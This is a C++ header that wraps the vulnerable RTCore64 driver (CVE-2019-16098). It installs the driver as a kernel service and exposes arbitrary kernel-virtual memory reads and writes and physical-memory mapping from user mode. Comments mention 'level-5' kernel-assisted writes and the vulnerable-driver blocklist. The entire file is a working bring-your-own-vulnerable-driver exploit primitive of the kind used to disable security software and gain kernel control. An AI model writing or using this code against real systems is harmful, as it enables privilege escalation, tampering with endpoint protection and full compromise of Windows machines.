// rtcore.h — RTCore64 driver wrapper
// provides arbitrary kernel-virtual memcpy (1/2/4/8 byte granularity) plus
// physical-memory mapping via IOCTL_MAP (MmMapIoSpace underneath, mapped to
// user via MmMapLockedPagesSpecifyCache). The latter is what level-5 kernel-
// assisted writes use.
//
// IOCTL layout — verified against CVE-2019-16098 public POCs.
// If your driver sample diverges, mark them in a config block and gate
// physical-mem access behind a sanity check.
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <memory>
#include <string>

namespace rt {

// --- service bits ---
constexpr const wchar_t* kSvcName = L"RTCore64";
constexpr const wchar_t* kSvcDisp = L"RTCore64";
constexpr const wchar_t* kDevPath = L"\\\\.\\RTCore64";

// --- IOCTLs ---
constexpr ULONG IOCTL_READ   = 0x80002048; // kernel-virt memcpy read  (up to 8 bytes)
constexpr ULONG IOCTL_WRITE  = 0x8000204C; // kernel-virt memcpy write
constexpr ULONG IOCTL_MAP    = 0x80002040; // map physical page -> user-visible VA
constexpr ULONG IOCTL_UNMAP  = 0x80002044; // unmap

// --- request structs ---
#pragma pack(push, 1)
struct MemReq {
    ULONG   pad0;
    ULONG   pad1;
    ULONG64 Address;    // kernel VA
    ULONG64 Value;      // in/out
    ULONG   Size;       // 1/2/4/8
    ULONG   pad2;
};
static_assert(sizeof(MemReq) == 0x20, "MemReq 0x20");

struct MapReq {
    ULONG64 InterfaceType;   // 0 (Internal/PCI)
    ULONG64 Bus;             // 0
    ULONG64 PhysAddr;        // page-aligned physical addr
    ULONG   Size;            // multiple of 0x1000 for a clean map
    ULONG   pad0;
    ULONG64 UserVa;          // out: user-visible VA of the mapped page
    ULONG64 KernVa;          // out: internal kernel VA (for unmap)
};

struct UnmapReq {
    ULONG64 UserVa;
    ULONG64 KernVa;
};
#pragma pack(pop)

struct HandleCloser { void operator()(HANDLE h) const noexcept {
    if (h && h != INVALID_HANDLE_VALUE) ::CloseHandle(h);
} };
using UniqueHandle = std::unique_ptr<std::remove_pointer_t<HANDLE>, HandleCloser>;

struct ScmCloser { void operator()(SC_HANDLE h) const noexcept {
    if (h) ::CloseServiceHandle(h);
} };
using UniqueScm = std::unique_ptr<std::remove_pointer_t<SC_HANDLE>, ScmCloser>;

// install + start RTCore64 via SCM
inline bool install_start(const std::wstring& driver_path) {
    UniqueScm scm(::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS));
    if (!scm) {
        std::fprintf(stderr, "[rt] OpenSCManager: %lu\n", ::GetLastError());
        return false;
    }
    UniqueScm svc(::OpenServiceW(scm.get(), kSvcName, SERVICE_ALL_ACCESS));
    if (!svc) {
        svc.reset(::CreateServiceW(scm.get(), kSvcName, kSvcDisp,
                                   SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                   SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                   driver_path.c_str(),
                                   nullptr, nullptr, nullptr, nullptr, nullptr));
        if (!svc) {
            std::fprintf(stderr, "[rt] CreateService: %lu\n", ::GetLastError());
            return false;
        }
    }
    if (!::StartServiceW(svc.get(), 0, nullptr)) {
        DWORD e = ::GetLastError();
        if (e != ERROR_SERVICE_ALREADY_RUNNING) {
            std::fprintf(stderr, "[rt] StartService: %lu "
                                 "(HVCI / vuln driver blocklist?)\n", e);
            return false;
        }
    }
    return true;
}

inline void stop_delete() {
    UniqueScm scm(::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS));
    if (!scm) return;
    UniqueScm svc(::OpenServiceW(scm.get(), kSvcName, SERVICE_ALL_ACCESS));
    if (!svc) return;
    SERVICE_STATUS st{};
    ::ControlService(svc.get(), SERVICE_CONTROL_STOP, &st);
    ::DeleteService(svc.get());
}

class Driver {
public:
    bool open() {
        hDev_.reset(::CreateFileW(kDevPath,
                                  GENERIC_READ | GENERIC_WRITE,
                                  0, nullptr, OPEN_EXISTING, 0, nullptr));
        return hDev_.get() != INVALID_HANDLE_VALUE;
    }

    // --- kernel virtual memory ---
    bool kv_read_sized(std::uint64_t addr, void* out, ULONG size) {
        if (size != 1 && size != 2 && size != 4 && size != 8) return false;
        MemReq r{};
        r.Address = addr;
        r.Size    = size;
        DWORD ret = 0;
        if (!::DeviceIoControl(hDev_.get(), IOCTL_READ,
                               &r, sizeof(r), &r, sizeof(r), &ret, nullptr))
            return false;
        std::memcpy(out, &r.Value, size);
        return true;
    }

    bool kv_write_sized(std::uint64_t addr, const void* in, ULONG size) {
        if (size != 1 && size != 2 && size != 4 && size != 8) return false;
        MemReq r{};
        r.Address = addr;
        r.Size    = size;
        std::memcpy(&r.Value, in, size);
        DWORD ret = 0;
        return !!::DeviceIoControl(hDev_.get(), IOCTL_WRITE,
                                   &r, sizeof(r), &r, sizeof(r), &ret, nullptr);
    }

    bool kv_read(std::uint64_t addr, void* out, std::size_t n) {
        auto* p = static_cast<unsigned char*>(out);
        std::size_t i = 0;
        while (i < n) {
            std::size_t chunk = (n - i >= 8) ? 8 : (n - i >= 4 ? 4 : (n - i >= 2 ? 2 : 1));
            std::uint64_t v = 0;
            if (!kv_read_sized(addr + i, &v, static_cast<ULONG>(chunk))) return false;
            std::memcpy(p + i, &v, chunk);
            i += chunk;
        }
        return true;
    }

    bool kv_write(std::uint64_t addr, const void* in, std::size_t n) {
        auto* p = static_cast<const unsigned char*>(in);
        std::size_t i = 0;
        while (i < n) {
            std::size_t chunk = (n - i >= 8) ? 8 : (n - i >= 4 ? 4 : (n - i >= 2 ? 2 : 1));
            std::uint64_t v = 0;
            std::memcpy(&v, p + i, chunk);
            if (!kv_write_sized(addr + i, &v, static_cast<ULONG>(chunk))) return false;
            i += chunk;
        }
        return true;
    }

    bool kv_u64(std::uint64_t a, std::uint64_t& v) { return kv_read_sized(a, &v, 8); }
    bool kv_u32(std::uint64_t a, std::uint32_t& v) { return kv_read_sized(a, &v, 4); }
    bool kv_u16(std::uint64_t a, std::uint16_t& v) { return kv_read_sized(a, &v, 2); }
    bool kv_u8 (std::uint64_t a, std::uint8_t&  v) { return kv_read_sized(a, &v, 1); }

    // --- physical memory mapping (level-5 primitive) ---
    // maps `size` bytes starting at page-aligned `phys` into our user AS.
    // caller unmaps via unmap_phys with the returned user_va/kern_va.
    bool map_phys(std::uint64_t phys, ULONG size,
                  std::uint64_t& user_va_out, std::uint64_t& kern_va_out)
    {
        MapReq r{};
        r.InterfaceType = 0;
        r.Bus = 0;
        r.PhysAddr = phys;
        r.Size = size;
        DWORD ret = 0;
        if (!::DeviceIoControl(hDev_.get(), IOCTL_MAP,
                               &r, sizeof(r), &r, sizeof(r), &ret, nullptr))
            return false;
        user_va_out = r.UserVa;
        kern_va_out = r.KernVa;
        return user_va_out != 0;
    }

    bool unmap_phys(std::uint64_t user_va, std::uint64_t kern_va) {
        UnmapReq r{};
        r.UserVa = user_va;
        r.KernVa = kern_va;
        DWORD ret = 0;
        return !!::DeviceIoControl(hDev_.get(), IOCTL_UNMAP,
                                   &r, sizeof(r), &r, sizeof(r), &ret, nullptr);
    }

    // convenience: read/write physical memory of arbitrary size (paginates)
    bool phys_read(std::uint64_t phys, void* out, std::size_t size) {
        auto* p = static_cast<unsigned char*>(out);
        std::size_t left = size;
        while (left) {
            std::uint64_t page_phys = phys & ~0xFFFULL;
            std::size_t  page_off  = static_cast<std::size_t>(phys - page_phys);
            std::size_t  take      = (0x1000 - page_off < left) ? (0x1000 - page_off) : left;
            std::uint64_t uva = 0, kva = 0;
            if (!map_phys(page_phys, 0x1000, uva, kva)) return false;
            std::memcpy(p, reinterpret_cast<void*>(uva + page_off), take);
            unmap_phys(uva, kva);
            phys += take; p += take; left -= take;
        }
        return true;
    }

    bool phys_write(std::uint64_t phys, const void* in, std::size_t size) {
        auto* p = static_cast<const unsigned char*>(in);
        std::size_t left = size;
        while (left) {
            std::uint64_t page_phys = phys & ~0xFFFULL;
            std::size_t  page_off  = static_cast<std::size_t>(phys - page_phys);
            std::size_t  take      = (0x1000 - page_off < left) ? (0x1000 - page_off) : left;
            std::uint64_t uva = 0, kva = 0;
            if (!map_phys(page_phys, 0x1000, uva, kva)) return false;
            std::memcpy(reinterpret_cast<void*>(uva + page_off), p, take);
            unmap_phys(uva, kva);
            phys += take; p += take; left -= take;
        }
        return true;
    }

private:
    UniqueHandle hDev_;
};

} // namespace rt
